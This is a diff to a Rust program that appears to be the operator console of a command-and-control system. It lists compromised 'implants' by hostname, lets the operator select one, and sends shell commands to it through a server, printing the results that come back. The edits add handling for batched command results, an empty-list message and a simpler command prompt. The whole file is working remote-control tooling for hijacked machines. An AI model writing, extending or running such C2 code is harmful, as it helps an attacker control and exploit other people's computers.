@@ -52,17 +52,26 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             Packet::ImplantList(implant_list) => {
                 implants = implant_list;
             }
+            Packet::CommandResults { results } => {
+                for (result, _code) in results {
+                    println!("{result}");
+                }
+            }
             _ => {}
         }
 
-        println!("Available implants: ");
-        for (i, implant) in implants.iter().enumerate() {
-            println!(
-                "[{}]: {} ({})",
-                i + 1,
-                implant.system_info.hostname,
-                implant.system_info.name
-            );
+        if implants.is_empty() {
+            println!("No implants found");
+        } else {
+            println!("Available implants: ");
+            for (i, implant) in implants.iter().enumerate() {
+                println!(
+                    "[{}]: {} ({})",
+                    i + 1,
+                    implant.system_info.hostname,
+                    implant.system_info.name
+                );
+            }
         }
 
         println!("");
@@ -79,6 +88,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         if let Ok(index) = input.parse::<usize>()
             && let Some(implant) = implants.get(index - 1)
         {
+            drop(connection);
             enter_command_loop(index - 1, implant);
         }
     }
@@ -92,25 +102,9 @@ fn connect() -> TcpStream {
 }
 
 fn enter_command_loop(implant_id: usize, implant: &Implant) {
-    let mut last_exit_code = None;
-    let mut last_output = None;
     loop {
-        if let Some(output) = last_output {
-            println!("{}", output);
-        }
-
-        print!(
-            "{}{}> ",
-            implant.system_info.hostname,
-            if let Some(exit_code) = last_exit_code {
-                format!(": {exit_code}")
-            } else {
-                "".to_string()
-            }
-        );
+        print!("{}> ", implant.system_info.hostname);
         stdout().flush().unwrap();
-        last_output = None;
-        last_exit_code = None;
 
         let mut input = String::new();
         stdin().read_line(&mut input).unwrap();
@@ -121,23 +115,26 @@ fn enter_command_loop(implant_id: usize, implant: &Implant) {
         }
 
         let mut connection = connect();
-        connection
-            .write(
-                encode(Packet::CommandPacket {
-                    implant_id,
-                    command: input.to_string(),
-                })
-                .unwrap()
-                .as_slice(),
-            )
-            .unwrap();
+        if !input.is_empty() {
+            connection
+                .write(
+                    encode(Packet::Command {
+                        implant_id,
+                        command: input.to_string(),
+                    })
+                    .unwrap()
+                    .as_slice(),
+                )
+                .unwrap();
+        }
 
         let packet = read_packet(&mut connection).unwrap();
 
         match packet {
-            Packet::CommandResult { exit_code, output } => {
-                last_exit_code = Some(exit_code);
-                last_output = Some(output);
+            Packet::CommandResults { results } => {
+                for (output, _) in results {
+                    println!("{output}");
+                }
             }
             _ => {}
         }
